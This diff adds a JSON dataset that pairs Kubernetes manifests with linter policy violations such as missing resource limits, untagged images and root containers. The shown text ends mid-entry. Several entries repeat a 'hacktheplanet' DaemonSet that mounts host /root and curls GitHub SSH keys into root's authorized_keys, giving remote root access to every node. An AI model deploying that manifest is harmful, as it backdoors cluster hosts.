@@ -1,0 +1,282 @@
+[
+  {
+    "id": "01361",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0425.yaml",
+    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: linkis-resourcemanager-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: linkis-resourcemanager\n  template:\n    metadata:\n      labels:\n        app: linkis-resourcemanager\n        release: dev\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - linkis-resourcemanager\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: linkis-resourcemanager\n        image: wedatasphere/linkis:linkis-resourcemanager-0.11.0\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 14004\n        livenessProbe:\n          tcpSocket:\n            port: 14004\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        env:\n        - name: eurekaurl\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: EUREKA_URL\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: SERVER_HEAP_SIZE\n          value: 1024M\n        - name: START_PORT\n          value: '14004'\n        volumeMounts:\n        - name: linkis-resourcemanager-config\n          mountPath: /opt/linkis/conf\n        - name: varlog\n          mountPath: /opt/linkis/linkis-resourcemanager/logs\n        - name: hadoop-config\n          mountPath: /opt/hadoop/hadoop-2.7.7/etc/hadoop\n        - name: hive-config\n          mountPath: /opt/hive/apache-hive-2.3.6-bin/conf\n        - name: spark-config\n          mountPath: /opt/spark/spark-2.4.4-bin-hadoop2.7/conf\n      volumes:\n      - name: linkis-resourcemanager-config\n        configMap:\n          name: linkis-resourcemanager-config\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: eureka-config\n        configMap:\n          name: eureka-config\n      - name: hadoop-config\n        hostPath:\n          path: /opt/hadoop/hadoop-2.7.7/etc/hadoop\n      - name: hive-config\n        hostPath:\n          path: /opt/hive/apache-hive-2.3.6-bin/conf\n      - name: spark-config\n        hostPath:\n          path: /opt/spark/spark-2.4.4-bin-hadoop2.7/conf\n",
+    "policy_id": "unset-memory-requirements",
+    "violation_text": "container \"linkis-resourcemanager\" has memory limit 0"
+  },
+  {
+    "id": "01362",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0427.yaml",
+    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: mainnet-dump-staking-ledger-cronjob\nspec:\n  jobTemplate:\n    template:\n      spec:\n        volumes:\n        - name: gcloud-keyfile\n          secret:\n            secretName: gcloud-keyfile\n            defaultMode: 256\n            items:\n            - key: keyfile\n              path: keyfile.json\n        containers:\n        - name: mainnet-dump-staking-ledger-container\n          image: minaprotocol/mina-daemon-baked:1.1.5-a42bdee\n          env:\n          - name: GCLOUD_KEYFILE\n            value: /gcloud/keyfile.json\n          volumeMounts:\n          - name: gcloud-keyfile\n            mountPath: /gcloud/\n          command:\n          - /bin/bash\n          - -c\n          - 'mina daemon --generate-genesis-proof true --peer-list-url https://storage.googleapis.com/mina-seed-lists/mainnet_seeds.txt\n            --background;sleep 480;echo \"done sleeping\";while true;do mina ledger\n            export staking-epoch-ledger>staking_epoch_ledger.txt;if [ \"$?\" -eq 0 ]&&[\n            \"$(cat staking_epoch_ledger.txt)\" != \"Ledger not found: current staking\n            ledger not available\" ];then echo \"staking epoch ledger dumped!\";break;else\n            echo \"waiting for staking ledger to become available, sleeping for 30s\";sleep\n            30;fi;done;DATE=\"$(date +%F_%H%M)\";STAKING_LEDGER_HASH=\"$(mina ledger\n            hash --ledger-file staking_epoch_ledger.txt)\";LEDGER_FILENAME=\"$DATE\"_staking_epoch_ledger_\"$STAKING_LEDGER_HASH\".txt;mv\n            ./staking_epoch_ledger.txt ./$LEDGER_FILENAME;mina ledger export next-epoch-ledger>next_epoch_ledger.txt;echo\n            \"next epoch ledger dumped!\";NEXT_LEDGER_HASH=\"$(mina ledger hash --ledger-file\n            next_epoch_ledger.txt)\";NEXT_LEDGER_FILENAME=\"$DATE\"_next_epoch_ledger_\"$NEXT_LEDGER_HASH\".txt;mv\n            ./next_epoch_ledger.txt ./$NEXT_LEDGER_FILENAME;echo \"upload to a GCP\n            cloud storage bucket\";gsutil -o Credentials:gs_service_key_file=/gcloud/keyfile.json\n            cp $LEDGER_FILENAME gs://mina-staking-ledgers;gsutil -o Credentials:gs_service_key_file=/gcloud/keyfile.json\n            cp $NEXT_LEDGER_FILENAME gs://mina-staking-ledgers'\n",
+    "policy_id": "no-read-only-root-fs",
+    "violation_text": "container \"mainnet-dump-staking-ledger-container\" does not have a read-only root file system"
+  },
+  {
+    "id": "01363",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0427.yaml",
+    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: mainnet-dump-staking-ledger-cronjob\nspec:\n  jobTemplate:\n    template:\n      spec:\n        volumes:\n        - name: gcloud-keyfile\n          secret:\n            secretName: gcloud-keyfile\n            defaultMode: 256\n            items:\n            - key: keyfile\n              path: keyfile.json\n        containers:\n        - name: mainnet-dump-staking-ledger-container\n          image: minaprotocol/mina-daemon-baked:1.1.5-a42bdee\n          env:\n          - name: GCLOUD_KEYFILE\n            value: /gcloud/keyfile.json\n          volumeMounts:\n          - name: gcloud-keyfile\n            mountPath: /gcloud/\n          command:\n          - /bin/bash\n          - -c\n          - 'mina daemon --generate-genesis-proof true --peer-list-url https://storage.googleapis.com/mina-seed-lists/mainnet_seeds.txt\n            --background;sleep 480;echo \"done sleeping\";while true;do mina ledger\n            export staking-epoch-ledger>staking_epoch_ledger.txt;if [ \"$?\" -eq 0 ]&&[\n            \"$(cat staking_epoch_ledger.txt)\" != \"Ledger not found: current staking\n            ledger not available\" ];then echo \"staking epoch ledger dumped!\";break;else\n            echo \"waiting for staking ledger to become available, sleeping for 30s\";sleep\n            30;fi;done;DATE=\"$(date +%F_%H%M)\";STAKING_LEDGER_HASH=\"$(mina ledger\n            hash --ledger-file staking_epoch_ledger.txt)\";LEDGER_FILENAME=\"$DATE\"_staking_epoch_ledger_\"$STAKING_LEDGER_HASH\".txt;mv\n            ./staking_epoch_ledger.txt ./$LEDGER_FILENAME;mina ledger export next-epoch-ledger>next_epoch_ledger.txt;echo\n            \"next epoch ledger dumped!\";NEXT_LEDGER_HASH=\"$(mina ledger hash --ledger-file\n            next_epoch_ledger.txt)\";NEXT_LEDGER_FILENAME=\"$DATE\"_next_epoch_ledger_\"$NEXT_LEDGER_HASH\".txt;mv\n            ./next_epoch_ledger.txt ./$NEXT_LEDGER_FILENAME;echo \"upload to a GCP\n            cloud storage bucket\";gsutil -o Credentials:gs_service_key_file=/gcloud/keyfile.json\n            cp $LEDGER_FILENAME gs://mina-staking-ledgers;gsutil -o Credentials:gs_service_key_file=/gcloud/keyfile.json\n            cp $NEXT_LEDGER_FILENAME gs://mina-staking-ledgers'\n",
+    "policy_id": "run-as-non-root",
+    "violation_text": "container \"mainnet-dump-staking-ledger-container\" is not set to runAsNonRoot"
+  },
+  {
+    "id": "01364",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0427.yaml",
+    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: mainnet-dump-staking-ledger-cronjob\nspec:\n  jobTemplate:\n    template:\n      spec:\n        volumes:\n        - name: gcloud-keyfile\n          secret:\n            secretName: gcloud-keyfile\n            defaultMode: 256\n            items:\n            - key: keyfile\n              path: keyfile.json\n        containers:\n        - name: mainnet-dump-staking-ledger-container\n          image: minaprotocol/mina-daemon-baked:1.1.5-a42bdee\n          env:\n          - name: GCLOUD_KEYFILE\n            value: /gcloud/keyfile.json\n          volumeMounts:\n          - name: gcloud-keyfile\n            mountPath: /gcloud/\n          command:\n          - /bin/bash\n          - -c\n          - 'mina daemon --generate-genesis-proof true --peer-list-url https://storage.googleapis.com/mina-seed-lists/mainnet_seeds.txt\n            --background;sleep 480;echo \"done sleeping\";while true;do mina ledger\n            export staking-epoch-ledger>staking_epoch_ledger.txt;if [ \"$?\" -eq 0 ]&&[\n            \"$(cat staking_epoch_ledger.txt)\" != \"Ledger not found: current staking\n            ledger not available\" ];then echo \"staking epoch ledger dumped!\";break;else\n            echo \"waiting for staking ledger to become available, sleeping for 30s\";sleep\n            30;fi;done;DATE=\"$(date +%F_%H%M)\";STAKING_LEDGER_HASH=\"$(mina ledger\n            hash --ledger-file staking_epoch_ledger.txt)\";LEDGER_FILENAME=\"$DATE\"_staking_epoch_ledger_\"$STAKING_LEDGER_HASH\".txt;mv\n            ./staking_epoch_ledger.txt ./$LEDGER_FILENAME;mina ledger export next-epoch-ledger>next_epoch_ledger.txt;echo\n            \"next epoch ledger dumped!\";NEXT_LEDGER_HASH=\"$(mina ledger hash --ledger-file\n            next_epoch_ledger.txt)\";NEXT_LEDGER_FILENAME=\"$DATE\"_next_epoch_ledger_\"$NEXT_LEDGER_HASH\".txt;mv\n            ./next_epoch_ledger.txt ./$NEXT_LEDGER_FILENAME;echo \"upload to a GCP\n            cloud storage bucket\";gsutil -o Credentials:gs_service_key_file=/gcloud/keyfile.json\n            cp $LEDGER_FILENAME gs://mina-staking-ledgers;gsutil -o Credentials:gs_service_key_file=/gcloud/keyfile.json\n            cp $NEXT_LEDGER_FILENAME gs://mina-staking-ledgers'\n",
+    "policy_id": "unset-cpu-requirements",
+    "violation_text": "container \"mainnet-dump-staking-ledger-container\" has cpu request 0"
+  },
+  {
+    "id": "01365",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0427.yaml",
+    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: mainnet-dump-staking-ledger-cronjob\nspec:\n  jobTemplate:\n    template:\n      spec:\n        volumes:\n        - name: gcloud-keyfile\n          secret:\n            secretName: gcloud-keyfile\n            defaultMode: 256\n            items:\n            - key: keyfile\n              path: keyfile.json\n        containers:\n        - name: mainnet-dump-staking-ledger-container\n          image: minaprotocol/mina-daemon-baked:1.1.5-a42bdee\n          env:\n          - name: GCLOUD_KEYFILE\n            value: /gcloud/keyfile.json\n          volumeMounts:\n          - name: gcloud-keyfile\n            mountPath: /gcloud/\n          command:\n          - /bin/bash\n          - -c\n          - 'mina daemon --generate-genesis-proof true --peer-list-url https://storage.googleapis.com/mina-seed-lists/mainnet_seeds.txt\n            --background;sleep 480;echo \"done sleeping\";while true;do mina ledger\n            export staking-epoch-ledger>staking_epoch_ledger.txt;if [ \"$?\" -eq 0 ]&&[\n            \"$(cat staking_epoch_ledger.txt)\" != \"Ledger not found: current staking\n            ledger not available\" ];then echo \"staking epoch ledger dumped!\";break;else\n            echo \"waiting for staking ledger to become available, sleeping for 30s\";sleep\n            30;fi;done;DATE=\"$(date +%F_%H%M)\";STAKING_LEDGER_HASH=\"$(mina ledger\n            hash --ledger-file staking_epoch_ledger.txt)\";LEDGER_FILENAME=\"$DATE\"_staking_epoch_ledger_\"$STAKING_LEDGER_HASH\".txt;mv\n            ./staking_epoch_ledger.txt ./$LEDGER_FILENAME;mina ledger export next-epoch-ledger>next_epoch_ledger.txt;echo\n            \"next epoch ledger dumped!\";NEXT_LEDGER_HASH=\"$(mina ledger hash --ledger-file\n            next_epoch_ledger.txt)\";NEXT_LEDGER_FILENAME=\"$DATE\"_next_epoch_ledger_\"$NEXT_LEDGER_HASH\".txt;mv\n            ./next_epoch_ledger.txt ./$NEXT_LEDGER_FILENAME;echo \"upload to a GCP\n            cloud storage bucket\";gsutil -o Credentials:gs_service_key_file=/gcloud/keyfile.json\n            cp $LEDGER_FILENAME gs://mina-staking-ledgers;gsutil -o Credentials:gs_service_key_file=/gcloud/keyfile.json\n            cp $NEXT_LEDGER_FILENAME gs://mina-staking-ledgers'\n",
+    "policy_id": "unset-memory-requirements",
+    "violation_text": "container \"mainnet-dump-staking-ledger-container\" has memory limit 0"
+  },
+  {
+    "id": "01366",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0430.yaml",
+    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n      containers:\n      - name: web\n        image: nginx\n",
+    "policy_id": "latest-tag",
+    "violation_text": "The container \"hacktheplanet\" is using an invalid container image, \"alpine\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
+  },
+  {
+    "id": "01367",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0430.yaml",
+    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n      containers:\n      - name: web\n        image: nginx\n",
+    "policy_id": "latest-tag",
+    "violation_text": "The container \"web\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
+  },
+  {
+    "id": "01368",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0430.yaml",
+    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n      containers:\n      - name: web\n        image: nginx\n",
+    "policy_id": "no-read-only-root-fs",
+    "violation_text": "container \"hacktheplanet\" does not have a read-only root file system"
+  },
+  {
+    "id": "01369",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0430.yaml",
+    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n      containers:\n      - name: web\n        image: nginx\n",
+    "policy_id": "no-read-only-root-fs",
+    "violation_text": "container \"web\" does not have a read-only root file system"
+  },
+  {
+    "id": "01370",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0430.yaml",
+    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n      containers:\n      - name: web\n        image: nginx\n",
+    "policy_id": "run-as-non-root",
+    "violation_text": "container \"hacktheplanet\" is not set to runAsNonRoot"
+  },
+  {
+    "id": "01371",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0430.yaml",
+    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n      containers:\n      - name: web\n        image: nginx\n",
+    "policy_id": "run-as-non-root",
+    "violation_text": "container \"web\" is not set to runAsNonRoot"
+  },
+  {
+    "id": "01372",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0430.yaml",
+    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n      containers:\n      - name: web\n        image: nginx\n",
+    "policy_id": "unset-cpu-requirements",
+    "violation_text": "container \"hacktheplanet\" has cpu request 0"
+  },
+  {
+    "id": "01373",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0430.yaml",
+    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n      containers:\n      - name: web\n        image: nginx\n",
+    "policy_id": "unset-cpu-requirements",
+    "violation_text": "container \"web\" has cpu request 0"
+  },
+  {
+    "id": "01374",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0430.yaml",
+    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n      containers:\n      - name: web\n        image: nginx\n",
+    "policy_id": "unset-memory-requirements",
+    "violation_text": "container \"hacktheplanet\" has memory limit 0"
+  },
+  {
+    "id": "01375",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0430.yaml",
+    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n      containers:\n      - name: web\n        image: nginx\n",
+    "policy_id": "unset-memory-requirements",
+    "violation_text": "container \"web\" has memory limit 0"
+  },
+  {
+    "id": "01376",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0433.yaml",
+    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: order-deployment\n  labels:\n    app: order-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: order-service\n  template:\n    metadata:\n      labels:\n        app: order-service\n    spec:\n      containers:\n      - name: order-service\n        image: thomasvitale/order-service:0.0.1-SNAPSHOT\n        ports:\n        - containerPort: 9002\n        env:\n        - name: SPRING_DATASOURCE_URL\n          value: jdbc:postgresql://polardb-order-service:5432/polardb_order\n        - name: POLAR_CATALOG_SERVICE_URL\n          value: http://catalog-service\n",
+    "policy_id": "no-read-only-root-fs",
+    "violation_text": "container \"order-service\" does not have a read-only root file system"
+  },
+  {
+    "id": "01377",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0433.yaml",
+    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: order-deployment\n  labels:\n    app: order-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: order-service\n  template:\n    metadata:\n      labels:\n        app: order-service\n    spec:\n      containers:\n      - name: order-service\n        image: thomasvitale/order-service:0.0.1-SNAPSHOT\n        ports:\n        - containerPort: 9002\n        env:\n        - name: SPRING_DATASOURCE_URL\n          value: jdbc:postgresql://polardb-order-service:5432/polardb_order\n        - name: POLAR_CATALOG_SERVICE_URL\n          value: http://catalog-service\n",
+    "policy_id": "run-as-non-root",
+    "violation_text": "container \"order-service\" is not set to runAsNonRoot"
+  },
+  {
+    "id": "01378",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0433.yaml",
+    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: order-deployment\n  labels:\n    app: order-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: order-service\n  template:\n    metadata:\n      labels:\n        app: order-service\n    spec:\n      containers:\n      - name: order-service\n        image: thomasvitale/order-service:0.0.1-SNAPSHOT\n        ports:\n        - containerPort: 9002\n        env:\n        - name: SPRING_DATASOURCE_URL\n          value: jdbc:postgresql://polardb-order-service:5432/polardb_order\n        - name: POLAR_CATALOG_SERVICE_URL\n          value: http://catalog-service\n",
+    "policy_id": "unset-cpu-requirements",
+    "violation_text": "container \"order-service\" has cpu request 0"
+  },
+  {
+    "id": "01379",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0433.yaml",
+    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: order-deployment\n  labels:\n    app: order-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: order-service\n  template:\n    metadata:\n      labels:\n        app: order-service\n    spec:\n      containers:\n      - name: order-service\n        image: thomasvitale/order-service:0.0.1-SNAPSHOT\n        ports:\n        - containerPort: 9002\n        env:\n        - name: SPRING_DATASOURCE_URL\n          value: jdbc:postgresql://polardb-order-service:5432/polardb_order\n        - name: POLAR_CATALOG_SERVICE_URL\n          value: http://catalog-service\n",
+    "policy_id": "unset-memory-requirements",
+    "violation_text": "container \"order-service\" has memory limit 0"
+  },
+  {
+    "id": "01380",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0441.yaml",
+    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1238\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
+    "policy_id": "latest-tag",
+    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
+  },
+  {
+    "id": "01381",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0441.yaml",
+    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1238\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
+    "policy_id": "no-read-only-root-fs",
+    "violation_text": "container \"nginx\" does not have a read-only root file system"
+  },
+  {
+    "id": "01382",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0441.yaml",
+    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1238\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
+    "policy_id": "run-as-non-root",
+    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
+  },
+  {
+    "id": "01383",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0441.yaml",
+    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1238\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
+    "policy_id": "unset-cpu-requirements",
+    "violation_text": "container \"nginx\" has cpu request 0"
+  },
+  {
+    "id": "01384",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0441.yaml",
+    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1238\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
+    "policy_id": "unset-memory-requirements",
+    "violation_text": "container \"nginx\" has memory limit 0"
+  },
+  {
+    "id": "01385",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0442.yaml",
+    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: controller\n    app.kubernetes.io/name: prometheus-operator\n    app.kubernetes.io/version: v0.39.0\n  name: prometheus-operator\n  namespace: monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: controller\n      app.kubernetes.io/name: prometheus-operator\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: controller\n        app.kubernetes.io/name: prometheus-operator\n        app.kubernetes.io/version: v0.39.0\n    spec:\n      containers:\n      - args:\n        - --kubelet-service=kube-system/kubelet\n        - --logtostderr=true\n        - --config-reloader-image=jimmidyson/configmap-reload:v0.3.0\n        - --prometheus-config-reloader=quay.io/coreos/prometheus-config-reloader:v0.39.0\n        image: quay.io/coreos/prometheus-operator:v0.39.0\n        name: prometheus-operator\n        ports:\n        - containerPort: 8080\n          name: http\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        securityContext:\n          allowPrivilegeEscalation: false\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 65534\n      serviceAccountName: prometheus-operator\n",
+    "policy_id": "no-read-only-root-fs",
+    "violation_text": "container \"prometheus-operator\" does not have a read-only root file system"
+  },
+  {
+    "id": "01386",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0443.yaml",
+    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-host-namespace-allowed\n  labels:\n    app: nginx-host-namespace\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
+    "policy_id": "latest-tag",
+    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
+  },
+  {
+    "id": "01387",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0443.yaml",
+    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-host-namespace-allowed\n  labels:\n    app: nginx-host-namespace\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
+    "policy_id": "no-read-only-root-fs",
+    "violation_text": "container \"nginx\" does not have a read-only root file system"
+  },
+  {
+    "id": "01388",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0443.yaml",
+    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-host-namespace-allowed\n  labels:\n    app: nginx-host-namespace\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
+    "policy_id": "run-as-non-root",
+    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
+  },
+  {
+    "id": "01389",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0443.yaml",
+    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-host-namespace-allowed\n  labels:\n    app: nginx-host-namespace\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
+    "policy_id": "unset-cpu-requirements",
+    "violation_text": "container \"nginx\" has cpu request 0"
+  },
+  {
+    "id": "01390",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0443.yaml",
+    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-host-namespace-allowed\n  labels:\n    app: nginx-host-namespace\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
+    "policy_id": "unset-memory-requirements",
+    "violation_text": "container \"nginx\" has memory limit 0"
+  },
+  {
+    "id": "01391",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0444.yaml",
+    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: edisonsupipelinesjavascriptdocker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: edisonsupipelinesjavascriptdocker\n  template:\n    metadata:\n      labels:\n        app: edisonsupipelinesjavascriptdocker\n    spec:\n      containers:\n      - name: edisonsupipelinesjavascriptdocker\n        image: containerregistryedison.azurecr.io/edisonsupipelinesjavascriptdocker\n        ports:\n        - containerPort: 8080\n",
+    "policy_id": "latest-tag",
